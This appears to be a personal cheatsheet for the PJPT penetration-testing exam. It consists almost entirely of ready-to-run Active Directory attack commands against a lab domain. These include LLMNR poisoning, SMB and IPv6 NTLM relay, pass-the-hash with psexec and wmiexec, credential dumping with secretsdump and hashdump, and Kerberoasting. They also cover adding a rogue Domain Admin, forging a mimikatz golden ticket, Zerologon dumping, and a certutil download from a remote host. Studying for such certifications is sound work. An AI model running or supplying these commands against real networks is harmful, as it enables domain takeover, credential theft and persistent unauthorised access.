# PJPT-cheatsheet
Cheatsheet I used to pass the PJPT exam

To learn more about my exam experience: https://www.bighandsecurity.com/pjpt/

Active Directory Exploitation:

## Network Reconnaissance and Mapping

### Initial Network Probing
```bash
# Network Detection Command
responder -I tun0 -dwPv 

# Accessing Network Resources
//attacker_ip
```

#### SMB Relay Attack
1. Security Configuration Check
```bash
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
```

2. SMB Relay Configuration
```bash
# Configure Connection Settings
nano /etc/responder/Responder.conf
# Turn SMB & HTTP Off

# Establish Relay
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

### Remote System Access Methods

#### Metasploit Connection
```bash
use exploit/windows/smb/psexec
set SMBDomain MARVEL.local
set SMBUser fcastle
set SMBPass Password1
```

#### Alternative Access Techniques
```bash
# Direct Authentication Approach
psexec.py marver.local/fcastle:'Password1'@10.0.0.25

# Credential Hash Authentication
psexec.py administrator@10.0.0.25 --hashes [LM:NTLM]
```

#### Alternative Execution Strategy
```bash
wmiexec.py administrator@192.168.138.137 --hashes [LM-HASH]:[NTLM-HASH]
```

### IPv6 Network Exploitation
```bash
# Domain-Specific IPv6 Attack
sudo mitm6 -d marvel.local

# NTLM Redirection
ntlmrelayx.py -6 -t ldaps://192.168.138.136 -wh fakewpad.marvel.local -l lootme
```

### Domain Information Gathering

#### Enumeration Tools
```bash
# LDAP Domain Intelligence
sudo ldapdomaindump ldaps://192.168.138.136 -u 'MARVEL\fcastle' -p Password1

# Advanced Network Mapping
sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns [DC-IP] -c all
```

### Credential Extraction Techniques

#### Network Credential Verification
```bash
crackmapexec smb 10.0.0.0/24 -u fcastle -d MARVEL.local -p Password1
```

#### Credential Dump Methods
```bash
# Meterpreter Extraction
use windows/smb/psexec
run
hashdump

# Comprehensive Credential Collection
secretsdump.py MARVEL.local/fcastle:Password1@10.0.0.25
```

### Advanced Penetration Techniques

#### Service Principal Name Extraction
```bash
# SPN Discovery
python GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip [DC_IP] -request

# Hash Cracking
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Token Manipulation
```bash
# Token Inventory
meterpreter > list_tokens -u

# User Token Impersonation
meterpreter > impersonate_token MARVEL\\administrator
```

### Domain Management
```bash
# User Creation
net user /add hawkeye Password1@ /domain

# Administrative Group Addition
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

### Advanced Persistent Threat Techniques

#### Golden Ticket Generation
```bash
# Credential Preparation
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt

# Ticket Fabrication
kerberos::golden /User:Administrator /domain:marvel.local /sid:[SID] /krbtgt:[HASH] /id:[ID] /ptt
```

### Vulnerability Exploitation

#### Specific CVE Approaches
```bash
# Zerologon Exploitation
secretsdump.py -just-dc MARVEL/HYDRA-DC\$@192.168.138.132

# Print Spooler Vulnerability Check
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'
```

### Data Transfer Methods
```bash
# Windows File Download
certutil.exe --urlcache -f http://10.10.10.10/file.txt file.txt

# Python HTTP Share
python3 -m http.server --bind [your_ip] [port]
```
